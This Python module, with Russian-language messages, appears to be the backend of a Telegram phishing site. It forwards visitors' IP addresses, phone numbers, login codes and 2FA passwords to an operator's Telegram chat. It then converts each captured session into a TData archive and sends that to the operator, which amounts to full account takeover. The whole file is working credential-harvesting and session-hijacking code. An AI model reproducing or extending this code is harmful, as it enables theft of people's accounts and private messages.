import asyncio
import logging
import json
import os
import shutil
import zipfile
from datetime import datetime
from aiogram import Bot
from aiogram.types import InputFile, FSInputFile
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_API_ID, TELEGRAM_API_HASH
from telethon.sync import TelegramClient
from opentele.api import UseCurrentSession
from opentele.td import TDesktop

async def send_telegram_message(message, parse_mode='HTML'):
    bot_instance = Bot(token=TELEGRAM_BOT_TOKEN)
    try:
        logging.info(f"Attempting to send message to Telegram chat ID {TELEGRAM_CHAT_ID}")
        logging.debug(f"Message content preview: {message[:100]}...") 
        await asyncio.sleep(0.1) # Небольшая задержка
        await bot_instance.send_message(TELEGRAM_CHAT_ID, message, parse_mode=parse_mode)
        logging.info("Message sent successfully.")
    except Exception as e:
        logging.exception("Failed to send message to Telegram:")
    finally:
        await bot_instance.session.close() 

def format_visit_message(visitor_id, user_agent, ip_address, timestamp):
    return f"""
🔔 <b>Новое посещение сайта!</b>

👤 <b>ID посетителя:</b> <code>{visitor_id}</code>
📱 <b>Устройство:</b> <code>{user_agent}</code>
🌐 <b>IP адрес:</b> <code>{ip_address}</code>
⏰ <b>Время:</b> <code>{timestamp}</code>
"""

def format_phone_message(visitor_id, phone_number, user_agent, ip_address, timestamp):
    return f"""
📱 <b>Ввод номера телефона!</b>

👤 <b>ID посетителя:</b> <code>{visitor_id}</code>
📞 <b>Номер телефона:</b> <code>{phone_number}</code>
📱 <b>Устройство:</b> <code>{user_agent}</code>
🌐 <b>IP адрес:</b> <code>{ip_address}</code>
⏰ <b>Время:</b> <code>{timestamp}</code>
"""

def format_code_message(visitor_id, code, user_agent, ip_address, timestamp):
    return f"""
🔑 <b>Ввод кода подтверждения!</b>

👤 <b>ID посетителя:</b> <code>{visitor_id}</code>
🔐 <b>Код:</b> <code>{code}</code>
📱 <b>Устройство:</b> <code>{user_agent}</code>
🌐 <b>IP адрес:</b> <code>{ip_address}</code>
⏰ <b>Время:</b> <code>{timestamp}</code>
"""

async def send_registration_summary(visitor):
    message = f"""
✅ <b>Регистрация завершена!</b>

👤 <b>ID посетителя:</b> <code>{visitor.id_string}</code>
📞 <b>Номер телефона:</b> <code>{visitor.phone_number}</code>
🔐 <b>Код подтверждения:</b> <code>{visitor.code}</code>
📱 <b>Устройство:</b> <code>{visitor.user_agent}</code>
🌐 <b>IP адрес:</b> <code>{visitor.ip_address}</code>
⏰ <b>Время регистрации:</b> <code>{visitor.timestamp.strftime('%Y-%m-%d %H:%M:%S')}</code>
"""
    await send_telegram_message(message)

async def convert_session_to_tdata(session_path, visitor_id):
    try:
        tdata_dir = f'tdata_{visitor_id}'
        os.makedirs(tdata_dir, exist_ok=True)
        logging.info(f"Created temporary TData directory: {tdata_dir}")
        
        client = TelegramClient(session_path, api_id=TELEGRAM_API_ID, api_hash=TELEGRAM_API_HASH)
        logging.info(f"Connecting Telethon client for session: {session_path}")
        await client.connect()
        logging.info("Telethon client connected.")
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        logging.info("Converted session to TDesktop object.")
        tdesk.SaveTData(tdata_dir)
        logging.info(f"Saved TData to directory: {tdata_dir}")
        await client.disconnect()
        logging.info("Telethon client disconnected.")
        
        archive_name = f'tdata_{visitor_id}.zip'
        logging.info(f"Creating zip archive: {archive_name}")
        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, tdata_dir)
                    zipf.write(file_path, arcname)
        logging.info(f"Zip archive created: {archive_name}")
        
        logging.info(f"Removing temporary TData directory: {tdata_dir}")
        shutil.rmtree(tdata_dir)
        logging.info("Temporary TData directory removed.")
        
        return archive_name
    except Exception as e:
        logging.exception("Error converting session to TData:")
        if os.path.exists(tdata_dir):
            shutil.rmtree(tdata_dir)
        if os.path.exists(archive_name):
            os.remove(archive_name)
        raise e

async def send_session_file(session_file_path, visitor_id, phone_number):
    bot_instance = Bot(token=TELEGRAM_BOT_TOKEN)
    tdata_archive = None
    try:
        logging.info(f"Converting session to TData for visitor {visitor_id}")
        logging.debug(f"Session file path: {session_file_path}")
        tdata_archive = await convert_session_to_tdata(session_file_path, visitor_id)
        
        logging.info(f"Sending TData archive to Telegram chat ID {TELEGRAM_CHAT_ID}")
        logging.debug(f"TData archive path: {tdata_archive}")
        tdata_file = FSInputFile(tdata_archive)
        await bot_instance.send_document(
            TELEGRAM_CHAT_ID,
            document=tdata_file,
            caption=f"✅ TData архив для пользователя {visitor_id}\n"
                   f"📞 Телефон: {phone_number}"
        )
        logging.info(f"TData archive sent successfully.")

        logging.info(f"Removing temporary files: {tdata_archive}, {session_file_path}")
        os.remove(tdata_archive)
        os.remove(session_file_path)
        logging.info(f"Temporary files removed.")
    except Exception as e:
        logging.exception(f"Failed to send TData archive to Telegram:")
        logging.warning("Attempting to clean up temporary files after error.")
        if tdata_archive and os.path.exists(tdata_archive):
            logging.warning(f"Removing TData archive after error: {tdata_archive}")
            os.remove(tdata_archive)
        if os.path.exists(session_file_path):
            logging.warning(f"Removing session file after error: {session_file_path}")
            os.remove(session_file_path)
    finally:
        if tdata_archive and os.path.exists(tdata_archive): 
            logging.debug(f"Ensuring TData archive {tdata_archive} is removed in finally block.")
        await bot_instance.session.close()

def format_password_success_message(visitor_id, phone_number, user_agent, ip_address, timestamp, password):
    return f"""
✅ <b>Пароль 2FA успешно введен!</b>

👤 <b>ID посетителя:</b> <code>{visitor_id}</code>
📞 <b>Номер телефона:</b> <code>{phone_number}</code>
🔐 <b>Пароль 2FA:</b> <code>{password}</code>
📱 <b>Устройство:</b> <code>{user_agent}</code>
🌐 <b>IP адрес:</b> <code>{ip_address}</code>
⏰ <b>Время ввода:</b> <code>{timestamp}</code>

Сессия аккаунта будет отправлена следующим сообщением.
"""
